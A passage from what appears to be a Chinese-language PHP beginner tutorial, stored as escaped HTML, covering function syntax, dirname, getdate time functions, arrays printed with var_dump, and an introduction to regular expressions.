punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;end&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;集团公司要求停止此项&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;17php函数基本语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#17php函数基本语法&#34;&gt;#&lt;/a&gt; 1.7PHP 函数基本语法&lt;/h3&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;Function&lt;/span&gt; 函数名&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;参数名&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;值&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; 参数名&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;值&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; 参数名n&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;值n&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    函数中的功能体&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; 返回值&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;文件包含&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/c9ab88ff7ea90290ca1e4cc82625d46d.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;数学常用函数总结:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/36f961d768a7b3a5b23764f164eb6657.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;字符串常用函数总结:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/078542c970bb9237220f2465ad0051d8.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;dirname:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$path&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/var/www/html/index.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$dir&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dirname&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$path&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$dir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 输出: /var/www/html&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/6ef56781615e9e7a561e6a7afd4dd003.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/8fb69b8c4548a9ebc0d93e865f5022ed.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/cdd032309af6962b40deac4f9f5961aa.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;疑似有点多了&lt;/p&gt;
&lt;p&gt;时间函数:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getdate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;年 :&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;year&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;月 :&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;mon&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;日 :&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;mday&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;时 :&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;hours&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;分 :&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;minutes&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;秒 :&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;seconds&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;一个小时中的第几钟 :&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;minutes&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;这是一分钟的第几秒 :&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;seconds&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;星期名称 :&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;weekday&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;月份名称 :&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;month&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;时间戳   :&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mytime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;18php数组结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#18php数组结构&#34;&gt;#&lt;/a&gt; 1.8PHP 数组结构&lt;/h3&gt;
&lt;p&gt;数组 array, 可以存入多个不同类型的数据，为复合数据类型。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$shu&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1.5&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;你好，世界&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;pre&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$shu&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;/pre&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;关于为什么在 var_dump 前后加入  &lt;code&gt;echo &amp;lt;pre&amp;gt;：&lt;/code&gt; echo &#39;&amp;lt;pre&amp;gt;&#39;; &lt;code&gt;将&lt;/code&gt;  &amp;lt;pre&amp;gt; &lt;code&gt; 标签作为 HTML 输出到浏览器，这告诉浏览器开始一个预格式化的区域。&lt;/code&gt; var_dump($shu); &lt;code&gt;输出数组的详细信息，这部分信息将被&lt;/code&gt;  &amp;lt;pre&amp;gt; &lt;code&gt; 标签格式化。最后，&lt;/code&gt; echo &#39;&amp;lt;/pre&amp;gt;&#39;; &lt;code&gt;关闭&lt;/code&gt;  &amp;lt;pre&amp;gt;` 标签，结束预格式化区域。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$kele&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;只有不断努力才能博得未来&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;NoAlike&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;PHP中文网&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;去PHP中文网学PHP&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;19&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;苹果和梨子我都爱&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;橘子我最爱&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 打印显示 $kele&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;pre&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$kele&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;/pre&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;通过键值对应符，可以做到索引数组下标不一次从 0 开始。&lt;/p&gt;
&lt;p&gt;常用操作数组函数&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/ea9f295bd96ee181954261575f5a86ed.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/fe1450e0f985b4e9ec5b7efc7bbfdb6f.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/6052ec69dd479d31125234d8a574c04a.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;19正则表达式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#19正则表达式&#34;&gt;#&lt;/a&gt; 1.9 正则表达式&lt;/h3&gt;
&lt;p&gt;可以有效地处理和操纵文本。例如，它可以用于验证用户输入的数据格式（例如，姓名，电子邮件，电话号码等）是否正确，在文本内容中查找或替换匹配的字符串，等等。&lt;/p&gt;
&lt;p&gt;在正则表达式中具有特殊含义的字符是：. * ? + [] () { } ^ $ | \。每当想按字面意义使用它们时，都需要反斜杠。例如，如果要匹配 “.”，则必须编写.。&lt;/p&gt;
